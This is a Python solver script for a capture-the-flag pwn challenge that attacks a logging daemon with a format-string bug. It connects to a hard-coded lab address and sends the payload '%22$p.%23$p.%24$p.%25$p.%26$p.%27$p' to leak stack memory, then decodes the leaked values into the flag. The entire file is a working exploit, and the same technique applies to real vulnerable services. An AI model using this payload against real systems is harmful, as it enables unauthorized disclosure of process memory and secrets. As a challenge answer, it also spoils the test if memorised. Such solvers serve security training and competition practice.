#!/usr/bin/env python3
"""
Solver for PWN CHALLENGE 1 — Format String on Logging Daemon
"""
import socket
import struct
import sys
import re

def solve(host, port):
    # Connect and leak flag from stack positions 22-27
    payload = '%22$p.%23$p.%24$p.%25$p.%26$p.%27$p\n'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.settimeout(5)

    # Read banner
    data = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b'message' in data.lower() or b'Submit' in data:
                break
        except socket.timeout:
            break

    print("[*] Banner:", data.decode(errors='ignore').strip())

    # Send format string payload
    s.sendall(payload.encode())

    # Read response
    resp = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()

    output = resp.decode(errors='ignore')
    print("[*] Response:", output.strip())

    # Extract hex values from response
    hex_values = re.findall(r'0x([0-9a-fA-F]+)', output)

    flag = b''
    for h in hex_values:
        val = int(h, 16)
        raw = struct.pack('<Q', val)
        flag += raw.rstrip(b'\x00')

    flag_str = flag.decode('utf-8', errors='ignore')
    print(f"[+] Flag: {flag_str}")
    return flag_str

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '172.31.102.101'
    port = sys.argv[2] if len(sys.argv) > 2 else '10094'
    solve(host, port)
